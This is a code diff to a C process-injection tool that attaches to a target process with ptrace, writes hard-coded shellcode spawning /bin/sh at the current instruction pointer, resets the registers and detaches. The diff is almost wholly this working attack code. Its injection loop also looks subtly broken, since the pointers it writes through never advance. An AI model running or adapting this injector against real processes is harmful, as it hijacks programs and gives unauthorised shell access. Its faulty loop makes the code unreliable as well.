@@ -27,11 +27,11 @@ void print_regs(struct user_regs_struct regs)
 int inject_code(pid_t pid, unsigned char *data, void *dst, int data_len)
 {
 	int i;
-    uint32_t *data = (uint32_t *)data; //making sure it's a 32bit(4byte) value
-    uint32_t *dst = (uint32_t *)dst; 
+    uint32_t *s = (uint32_t *)data; //making sure it's a 32bit(4byte) value
+    uint32_t *d = (uint32_t *)dst; 
 
     for(i=0; i<data_len; i+=4, data++, dst++){
-        if(ptrace(PTRACE_POKETEXT, pid, dst, data) < 0){
+        if(ptrace(PTRACE_POKETEXT, pid, d, *s) < 0){
             perror("Error-POKETEXT");
             exit(1);
         }
@@ -47,7 +47,15 @@ int main(int argc, char *argv[])
     int syscall; //syscall id
     long dst; //destiantion addr
 
-    char *shellcode;//TODO
+
+    /* Spawn a shell */
+    unsigned char *shellcode =
+      "\x48\x31\xc0\x48\x89\xc2\x48\x89"
+      "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
+      "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
+      "\x2f\x73\x68\x00\xcc\x90\x90\x90";
+
+    unsigned int shellcode_len = 32;
 
     if(argc != 2){
         fprintf(stderr, "%sUsage:\t%s <pid>\n", BAD, argv[0]);
@@ -70,10 +78,20 @@ int main(int argc, char *argv[])
         exit(1);
     }
 
-    print_regs(regs);
+    //print_regs(regs);
 
-    printf("%sInjecting to the shellcode into %p:%p ...", INFO, (void *)regs.rip, regs.rip);
+    printf("%sInjecting to the shellcode into %p\n", INFO, (void *)regs.rip);
     inject_code(target, shellcode, (void *)regs.rip, shellcode_len);
+    regs.rip += 3;
+    printf("%sSetting the instruction pointer back to %p\n", INFO, (void *)regs.rip);
+
+    if (ptrace(PTRACE_SETREGS, target, NULL, &regs)< 0)
+    {
+      perror("Error-SETREGS");
+      exit(1);
+    }
+
+    printf ("%sRun it!\n", GOOD);
 
     if (ptrace(PTRACE_DETACH, target, NULL, NULL)< 0)
 	{
